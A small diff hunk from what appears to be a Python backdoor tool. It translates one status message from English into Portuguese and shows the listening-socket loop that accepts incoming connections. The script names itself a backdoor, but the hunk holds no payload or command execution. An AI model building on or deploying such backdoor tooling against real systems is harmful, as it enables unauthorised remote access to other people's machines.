@@ -210,7 +210,7 @@ def start_server():
     server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     server_sock.bind((SERVER_HOST, SERVER_PORT))
     server_sock.listen()
-    print(f"{green}[+] Backdoor On On Port{off} {SERVER_PORT}")
+    print(f"{green}[+] A porta do Backdoor foi aberta em {off} {SERVER_PORT}")
     while True:
         client_sock, addr = server_sock.accept()
         print(f"{green}[+] User Connect: {addr}")
